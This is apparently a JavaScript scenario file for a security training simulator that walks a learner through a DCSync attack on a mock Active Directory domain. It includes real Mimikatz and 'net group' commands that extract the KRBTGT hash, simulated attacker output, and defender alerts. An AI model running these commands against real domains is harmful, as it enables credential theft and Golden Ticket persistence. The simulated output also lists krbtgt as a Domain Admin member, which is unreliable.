/**
 * DCSync Attack Scenario
 *
 * This scenario simulates the DCSync attack, where an attacker uses
 * directory replication privileges to request password hashes directly
 * from a domain controller. With these hashes, attackers can craft
 * Golden Tickets or perform pass‑the‑hash attacks to move laterally
 * and persist in the environment.
 */

export const dcsyncScenario = {
  id: 'dcsync',
  title: 'DCSync: Replicating Password Hashes',
  description:
    'Learn how attackers leverage DCSync to replicate password hashes from a domain controller.',

  // Network configuration
  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  // Guide content for the sidebar
  guide: {
    overview: `**DCSync** allows an attacker with directory replication privileges to request password hashes directly from Active Directory.\n\n` +
      `**Attack Flow:**\n` +
      `1. Identify accounts with replication privileges (often Domain Admins)\n` +
      `2. Use Mimikatz to perform DCSync and replicate password hashes for key accounts (e.g. krbtgt)\n` +
      `3. Use the stolen hash for further attacks or offline cracking\n\n` +
      `**Why This Matters:**\n` +
      `DCSync is a high‑impact technique because it allows attackers to extract NTLM hashes for any account, including the KRBTGT account used to sign Kerberos tickets. With these hashes, attackers can impersonate users or create Golden Tickets to maintain long‑term persistence.`,
    steps: [
      {
        number: 1,
        title: 'Identify Replication‑Privileged Accounts',
        description:
          'List domain admin or replication‑privileged accounts that can perform DCSync. In practice, tools like BloodHound can identify these; here we use a simple net group enumeration.',
        command: 'net group "Domain Admins" /domain',
        tip:
          'Domain Admins and accounts with the Replicating Directory Changes permissions can perform DCSync'
      },
      {
        number: 2,
        title: 'Perform DCSync with Mimikatz',
        description:
          'Use Mimikatz to request the password hash of the KRBTGT account from the domain controller.',
        command:
          'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        tip: 'Replicating the KRBTGT hash allows forging Golden Tickets'
      },
      {
        number: 3,
        title: 'Review and Use the Extracted Hash',
        description:
          'The DCSync output contains the NTLM hash of the requested account. This can be used to create Golden Tickets or for Pass‑the‑Hash attacks.',
        command: null,
        tip:
          'Treat the extracted hash like a password: keep it secure and use it carefully in later steps'
      }
    ]
  },

  // Simulation steps executed in the terminal
  steps: [
    {
      id: 1,
      expectedCommand: 'net group "Domain Admins" /domain',
      attackerOutput: [
        '[*] Enumerating members of Domain Admins...',
        '[+] CONTOSO\\Administrator',
        '[+] CONTOSO\\svc_backup',
        '[+] CONTOSO\\sqlservice',
        '[+] CONTOSO\\krbtgt',
        '[+] Enumeration complete'
      ],
      serverOutput: [
        '[SAMR] NetGroupGetUsers request from 10.0.0.5',
        '[AUDIT] Domain group enumeration: Domain Admins'
      ],
      delay: 500
    },
    {
      id: 2,
      // Accept multiple valid ways of invoking DCSync, including different casing,
      // optional .exe suffix, and optional $ on the user. The first command is
      // treated as the canonical suggestion.
      expectedCommands: [
        'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        'mimikatz "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        'mimikatz.exe "lsadump::dcsync /domain:CONTOSO.LOCAL /user:krbtgt"',
        'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt$"'
      ],
      // Provide helpful messages for common mistakes so the simulator can guide the user
      commonMistakes: [
        {
          pattern: '^mimikatz(\\.exe)?\\s+lsadump::dcsync',
          message: 'Wrap the lsadump::dcsync command in quotes: \"lsadump::dcsync /domain:contoso.local /user:krbtgt\"'
        },
        {
          pattern: '^mimikatz(\\.exe)?\\s*$',
          message: 'You need to specify the lsadump::dcsync module and provide the /domain and /user parameters.'
        }
      ],
      attackerOutput: [
        '[*] Using DCSync to replicate KRBTGT account credentials...',
        '[*] Connecting to DC01.contoso.local...',
        '[+] Authenticated with replication privileges',
        '[*] Requesting secrets for user: krbtgt',
        '[+] DCSync successful! Here are the credentials:',
        'User : krbtgt$',
        'NTLM : fffffffffffffffffffffffffffffff0',
        'LM   : aad3b435b51404eeaad3b435b51404ee',
        '[+] Hashes retrieved and stored'
      ],
      serverOutput: [
        '[DS-REPL] DRSGetNCChanges request from 10.0.0.5',
        '[DS-REPL] Object: krbtgt',
        '[AUDIT] Replication data request responded',
        '[ALERT] Unusual replication request detected from 10.0.0.5'
      ],
      delay: 700
    },
    {
      id: 3,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] DCSync Attack Summary',
        '[+] ============================================',
        '[+] Replication accounts enumerated: 4',
        '[+] Hashes extracted: 1 (krbtgt)',
        '[+] Next Steps:',
        '[*] 1. Use krbtgt NTLM hash to forge a Golden Ticket',
        '[*] 2. Perform Pass‑the‑Hash to access critical systems',
        '[*] 3. Consider cracking any extracted hashes offline',
        '',
        '[+] Attack successful! 🎯'
      ],
      serverOutput: [
        '',
        '[ALERT] SECURITY INCIDENT DETECTED',
        '[ALERT] Replication data accessed for account: krbtgt',
        '[ALERT] Recommend auditing replication privileges and resetting KRBTGT twice'
      ],
      delay: 400
    }
  ]
};

export default dcsyncScenario;